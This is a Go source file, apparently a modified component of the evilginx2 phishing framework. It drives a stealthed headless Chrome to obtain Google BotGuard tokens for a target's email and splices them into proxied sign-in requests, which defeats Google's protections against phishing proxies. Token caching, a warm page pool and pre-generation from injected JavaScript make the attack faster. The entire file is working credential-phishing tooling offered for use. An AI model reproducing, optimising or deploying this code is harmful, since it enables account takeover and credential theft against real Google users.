package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

// ============================================================================
// OPTIMIZED EVILPUPPET - Based on Evilginx Pro research
// Key optimizations:
// 1. Pre-warmed Chrome with persistent browser instance
// 2. Token caching per email (5 min TTL)
// 3. Warm page pool for faster token generation
// 4. Async token generation with callback
// ============================================================================

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	withDevTools   bool
	slowMotionTime time.Duration

	token string
	email string
}

var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

// ============================================================================
// GLOBAL STATE - Persistent browser and token cache
// ============================================================================

var (
	// Chrome process management
	chromeMutex      sync.Mutex
	chromeReady      bool = false
	chromeReadyMutex sync.RWMutex

	// Persistent browser instance (kept warm)
	globalBrowser     *rod.Browser
	globalBrowserLock sync.Mutex

	// Token cache with TTL
	tokenCache     = make(map[string]*cachedToken)
	tokenCacheLock sync.RWMutex

	// Warm page pool
	warmPagePool     []*rod.Page
	warmPagePoolLock sync.Mutex
	warmPagePoolSize = 3 // Keep 3 warm pages ready
)

type cachedToken struct {
	token     string
	email     string
	createdAt time.Time
	ttl       time.Duration
}

func (ct *cachedToken) isValid() bool {
	return time.Since(ct.createdAt) < ct.ttl
}

// ============================================================================
// TOKEN CACHE FUNCTIONS
// ============================================================================

// GetCachedToken returns a cached token if available and valid
func GetCachedToken(email string) (string, bool) {
	tokenCacheLock.RLock()
	defer tokenCacheLock.RUnlock()

	if cached, exists := tokenCache[email]; exists && cached.isValid() {
		log.Info("[GoogleBypasser] Cache HIT for email: %s", email)
		return cached.token, true
	}
	return "", false
}

// SetCachedToken stores a token in the cache
func SetCachedToken(email, token string) {
	tokenCacheLock.Lock()
	defer tokenCacheLock.Unlock()

	tokenCache[email] = &cachedToken{
		token:     token,
		email:     email,
		createdAt: time.Now(),
		ttl:       5 * time.Minute, // 5 minute TTL
	}
	log.Info("[GoogleBypasser] Cached token for email: %s (TTL: 5 min)", email)
}

// CleanExpiredTokens removes expired tokens from cache
func CleanExpiredTokens() {
	tokenCacheLock.Lock()
	defer tokenCacheLock.Unlock()

	for email, cached := range tokenCache {
		if !cached.isValid() {
			delete(tokenCache, email)
			log.Debug("[GoogleBypasser] Removed expired token for: %s", email)
		}
	}
}

// ============================================================================
// CHROME MANAGEMENT - Persistent browser instance
// ============================================================================

// findChromeBinary finds the Chrome/Chromium binary path
func findChromeBinary() (string, error) {
	chromePaths := []string{
		"google-chrome",
		"google-chrome-stable",
		"chromium-browser",
		"chromium",
		"/usr/bin/google-chrome",
		"/usr/bin/google-chrome-stable",
		"/usr/bin/chromium-browser",
		"/usr/bin/chromium",
		"/opt/google/chrome/google-chrome",
		"/snap/bin/chromium",
	}

	for _, path := range chromePaths {
		if fullPath, err := exec.LookPath(path); err == nil {
			return fullPath, nil
		}
	}

	return "", fmt.Errorf("Chrome/Chromium binary not found. Please install Google Chrome or Chromium")
}

// isChromeRunning checks if Chrome is running on port 9222
func isChromeRunning() bool {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// startChromeHeadless starts Chrome in headless mode with remote debugging
// OPTIMIZATION: Added stealth flags to avoid detection
func startChromeHeadless() error {
	chromeMutex.Lock()
	defer chromeMutex.Unlock()

	if isChromeRunning() {
		log.Info("[GoogleBypasser] Chrome is already running on port 9222")
		return nil
	}

	chromePath, err := findChromeBinary()
	if err != nil {
		return err
	}

	log.Info("[GoogleBypasser] Starting Chrome headless: %s", chromePath)

	// OPTIMIZATION: Added more stealth flags
	cmd := exec.Command(chromePath,
		"--headless=new", // Use new headless mode (more stealthy)
		"--disable-gpu",
		"--no-sandbox",
		"--disable-dev-shm-usage",
		"--remote-debugging-port=9222",
		"--remote-debugging-address=127.0.0.1",
		"--disable-background-networking",
		"--disable-default-apps",
		"--disable-extensions",
		"--disable-sync",
		"--disable-translate",
		"--hide-scrollbars",
		"--metrics-recording-only",
		"--mute-audio",
		"--no-first-run",
		"--safebrowsing-disable-auto-update",
		// Stealth flags
		"--disable-blink-features=AutomationControlled",
		"--disable-infobars",
		"--window-size=1920,1080",
		"--start-maximized",
		"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	)

	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start Chrome: %v", err)
	}

	log.Info("[GoogleBypasser] Chrome process started with PID: %d", cmd.Process.Pid)

	// Wait for Chrome to be ready
	for i := 0; i < 20; i++ {
		time.Sleep(500 * time.Millisecond)
		if isChromeRunning() {
			log.Success("[GoogleBypasser] Chrome is now running on port 9222")
			return nil
		}
	}

	return fmt.Errorf("Chrome started but not responding on port 9222 after 10 seconds")
}

// ensureChromeRunning ensures Chrome is running, starting it if necessary
func ensureChromeRunning() error {
	maxRetries := 3

	for attempt := 1; attempt <= maxRetries; attempt++ {
		if isChromeRunning() {
			return nil
		}

		log.Warning("[GoogleBypasser] Chrome not running (attempt %d/%d), starting...", attempt, maxRetries)

		if err := startChromeHeadless(); err != nil {
			log.Error("[GoogleBypasser] Failed to start Chrome: %v", err)
			if attempt < maxRetries {
				time.Sleep(2 * time.Second)
				continue
			}
			return err
		}

		if isChromeRunning() {
			return nil
		}
	}

	return fmt.Errorf("failed to ensure Chrome is running after %d attempts", maxRetries)
}

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	ws, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || ws == "" {
		return "", fmt.Errorf("webSocketDebuggerUrl not found")
	}

	return ws, nil
}

// ============================================================================
// GLOBAL BROWSER MANAGEMENT - Keep browser warm
// ============================================================================

// GetGlobalBrowser returns the persistent browser instance, creating it if needed
func GetGlobalBrowser() (*rod.Browser, error) {
	globalBrowserLock.Lock()
	defer globalBrowserLock.Unlock()

	// If we already have a connected browser, return it
	if globalBrowser != nil {
		return globalBrowser, nil
	}

	// Ensure Chrome is running
	if err := ensureChromeRunning(); err != nil {
		return nil, err
	}

	// Get WebSocket URL
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		return nil, err
	}

	// Create and connect browser
	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return nil, err
	}

	globalBrowser = browser
	log.Success("[GoogleBypasser] Global browser instance created and connected")

	return globalBrowser, nil
}

// ============================================================================
// WARM PAGE POOL - Pre-create pages for faster token generation
// ============================================================================

// InitWarmPagePool creates warm pages that are pre-navigated to Google
func InitWarmPagePool() error {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	browser, err := GetGlobalBrowser()
	if err != nil {
		return err
	}

	log.Info("[GoogleBypasser] Initializing warm page pool (size: %d)...", warmPagePoolSize)

	for i := 0; i < warmPagePoolSize; i++ {
		page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
		if err != nil {
			log.Warning("[GoogleBypasser] Failed to create warm page %d: %v", i, err)
			continue
		}

		// Pre-navigate to Google login page
		go func(p *rod.Page, idx int) {
			if err := p.Navigate("https://accounts.google.com/"); err != nil {
				log.Warning("[GoogleBypasser] Failed to pre-navigate warm page %d: %v", idx, err)
				return
			}
			p.MustWaitLoad()
			log.Debug("[GoogleBypasser] Warm page %d ready at accounts.google.com", idx)
		}(page, i)

		warmPagePool = append(warmPagePool, page)
	}

	log.Success("[GoogleBypasser] Warm page pool initialized with %d pages", len(warmPagePool))
	return nil
}

// GetWarmPage returns a warm page from the pool, or creates a new one
func GetWarmPage() (*rod.Page, error) {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	// Try to get a page from the pool
	if len(warmPagePool) > 0 {
		page := warmPagePool[0]
		warmPagePool = warmPagePool[1:]
		log.Debug("[GoogleBypasser] Got warm page from pool (remaining: %d)", len(warmPagePool))

		// Replenish the pool in background
		go replenishWarmPagePool()

		return page, nil
	}

	// No warm pages available, create a new one
	log.Warning("[GoogleBypasser] Warm page pool empty, creating new page...")
	browser, err := GetGlobalBrowser()
	if err != nil {
		return nil, err
	}

	page, err := browser.Page(proto.TargetCreateTarget{URL: "https://accounts.google.com/"})
	if err != nil {
		return nil, err
	}

	page.MustWaitLoad()
	return page, nil
}

// replenishWarmPagePool adds a new warm page to the pool
func replenishWarmPagePool() {
	warmPagePoolLock.Lock()
	defer warmPagePoolLock.Unlock()

	if len(warmPagePool) >= warmPagePoolSize {
		return
	}

	browser, err := GetGlobalBrowser()
	if err != nil {
		log.Warning("[GoogleBypasser] Failed to get browser for pool replenishment: %v", err)
		return
	}

	page, err := browser.Page(proto.TargetCreateTarget{URL: "https://accounts.google.com/"})
	if err != nil {
		log.Warning("[GoogleBypasser] Failed to create page for pool: %v", err)
		return
	}

	page.MustWaitLoad()
	warmPagePool = append(warmPagePool, page)
	log.Debug("[GoogleBypasser] Replenished warm page pool (size: %d)", len(warmPagePool))
}

// ============================================================================
// PRE-WARM FUNCTION - Call at evilginx startup
// ============================================================================

// PreWarmChrome should be called at startup to ensure Chrome is ready before any requests
// OPTIMIZATION: Now also initializes warm page pool
func PreWarmChrome() error {
	log.Info("[GoogleBypasser] Pre-warming Chrome for BotGuard token generation...")

	// Ensure Chrome is running
	if err := ensureChromeRunning(); err != nil {
		log.Error("[GoogleBypasser] Failed to pre-warm Chrome: %v", err)
		return err
	}

	// Create global browser instance
	browser, err := GetGlobalBrowser()
	if err != nil {
		log.Error("[GoogleBypasser] Failed to create global browser: %v", err)
		return err
	}

	// Initialize warm page pool
	if err := InitWarmPagePool(); err != nil {
		log.Warning("[GoogleBypasser] Failed to initialize warm page pool: %v", err)
		// Continue anyway - we can create pages on demand
	}

	// Mark Chrome as ready
	chromeReadyMutex.Lock()
	chromeReady = true
	chromeReadyMutex.Unlock()

	log.Success("[GoogleBypasser] Chrome pre-warmed and ready!")
	log.Info("[GoogleBypasser] - Global browser: connected")
	log.Info("[GoogleBypasser] - Warm page pool: %d pages ready", len(warmPagePool))
	log.Info("[GoogleBypasser] - Browser version: %s", browser.MustVersion().Product)

	// Start background token cache cleaner
	go func() {
		ticker := time.NewTicker(1 * time.Minute)
		for range ticker.C {
			CleanExpiredTokens()
		}
	}()

	return nil
}

// IsChromeReady returns true if Chrome has been pre-warmed
func IsChromeReady() bool {
	chromeReadyMutex.RLock()
	defer chromeReadyMutex.RUnlock()
	return chromeReady
}

// ============================================================================
// GOOGLE BYPASSER METHODS - Optimized for speed
// ============================================================================

func (b *GoogleBypasser) Launch() {
	log.Debug("[GoogleBypasser]: Launching Browser .. ")

	// OPTIMIZATION: Use warm page from pool instead of creating new browser
	page, err := GetWarmPage()
	if err != nil {
		log.Error("[GoogleBypasser] Failed to get warm page: %v", err)
		// Fallback to original method
		b.launchFallback()
		return
	}

	b.page = page
	b.browser, _ = GetGlobalBrowser()
	log.Debug("[GoogleBypasser]: Using warm page from pool")
}

func (b *GoogleBypasser) launchFallback() {
	log.Warning("[GoogleBypasser] Using fallback launcher...")

	if err := ensureChromeRunning(); err != nil {
		log.Error("[GoogleBypasser] Fallback: Chrome not available, using go-rod launcher")
		l := launcher.New().Headless(b.isHeadless).Devtools(b.withDevTools)
		if os.Geteuid() == 0 {
			l = l.NoSandbox(true)
		}
		wsURL := l.MustLaunch()
		b.browser = rod.New().ControlURL(wsURL)
		if b.slowMotionTime > 0 {
			b.browser = b.browser.SlowMotion(b.slowMotionTime)
		}
		b.browser = b.browser.MustConnect()
		b.page = b.browser.MustPage()
		return
	}

	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("[GoogleBypasser] Fallback: Failed to get WebSocket URL: %v", err)
		return
	}

	b.browser = rod.New().ControlURL(wsURL).MustConnect()
	b.page = b.browser.MustPage()
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	exp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
	email_match := exp.FindSubmatch(body)
	matches := len(email_match)
	if matches < 2 {
		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
		return
	}
	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
	log.Debug("[GoogleBypasser]: Using email to obtain valid token : %v", b.email)
}

func (b *GoogleBypasser) GetToken() {
	// OPTIMIZATION: Check cache first
	if cachedToken, found := GetCachedToken(b.email); found {
		b.token = cachedToken
		log.Success("[GoogleBypasser] Using cached token for %s", b.email)
		return
	}

	stop := make(chan struct{})
	var once sync.Once
	timeout := time.After(30 * time.Second) // Reduced timeout since we're using warm pages

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=MI613e") {
			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
			if err != nil {
				log.Error("Failed to decode body while trying to obtain fresh botguard token: %v", err)
				return
			}
			b.token = bgRegexp.FindString(decodedBody)
			log.Debug("[GoogleBypasser]: Obtained Token : %v", b.token)
			once.Do(func() { close(stop) })
		}
	})()

	// OPTIMIZATION: Page should already be at accounts.google.com from warm pool
	// Just need to refresh and enter email
	log.Debug("[GoogleBypasser]: Refreshing Google login page...")
	err := b.page.Navigate("https://accounts.google.com/")
	if err != nil {
		log.Error("Failed to navigate to Google login page: %v", err)
		return
	}

	log.Debug("[GoogleBypasser]: Waiting for the email input field...")
	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
	if emailField == nil {
		log.Error("Failed to find the email input field")
		return
	}

	err = emailField.Input(b.email)
	if err != nil {
		log.Error("Failed to input email: %v", err)
		return
	}
	log.Debug("[GoogleBypasser]: Entered target email: %v", b.email)

	err = b.page.Keyboard.Press(input.Enter)
	if err != nil {
		log.Error("Failed to submit the login form: %v", err)
		return
	}
	log.Debug("[GoogleBypasser]: Submitted Login Form...")

	select {
	case <-stop:
		for b.token == "" {
			select {
			case <-time.After(500 * time.Millisecond):
				log.Debug("[GoogleBypasser]: Waiting for token...")
			case <-timeout:
				log.Error("[GoogleBypasser]: Timed out while waiting to obtain the token")
				return
			}
		}

		// OPTIMIZATION: Cache the token
		SetCachedToken(b.email, b.token)

		// Close the page (it will be replaced by a fresh warm page)
		err := b.page.Close()
		if err != nil {
			log.Warning("Failed to close the page: %v", err)
		}

	case <-timeout:
		log.Error("[GoogleBypasser]: Timed out while waiting to obtain the token")
		return
	}
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	log.Debug("[GoogleBypasser]: Old body : %v", string(body))
	newBody := bgRegexp.ReplaceAllString(string(body), b.token)
	log.Debug("[GoogleBypasser]: New body : %v", newBody)
	return []byte(newBody)
}

// ============================================================================
// ASYNC TOKEN GENERATION - For proactive token generation
// ============================================================================

// GenerateTokenAsync generates a token asynchronously and calls the callback when done
func GenerateTokenAsync(email string, callback func(token string, err error)) {
	go func() {
		// Check cache first
		if cachedToken, found := GetCachedToken(email); found {
			callback(cachedToken, nil)
			return
		}

		// Generate new token
		b := &GoogleBypasser{
			isHeadless:   true,
			withDevTools: false,
			email:        email,
		}

		b.Launch()
		if b.page == nil {
			callback("", fmt.Errorf("failed to launch browser"))
			return
		}

		b.GetToken()
		if b.token == "" {
			callback("", fmt.Errorf("failed to obtain token"))
			return
		}

		callback(b.token, nil)
	}()
}

// PreGenerateToken starts token generation before the MI613e request arrives
// This should be called when the email is detected (e.g., from JS injection)
func PreGenerateToken(email string) {
	log.Info("[GoogleBypasser] Pre-generating token for: %s", email)

	// Check if already cached
	if _, found := GetCachedToken(email); found {
		log.Info("[GoogleBypasser] Token already cached for: %s", email)
		return
	}

	// Generate in background
	GenerateTokenAsync(email, func(token string, err error) {
		if err != nil {
			log.Error("[GoogleBypasser] Pre-generation failed for %s: %v", email, err)
			return
		}
		log.Success("[GoogleBypasser] Pre-generated token for: %s", email)
	})
}
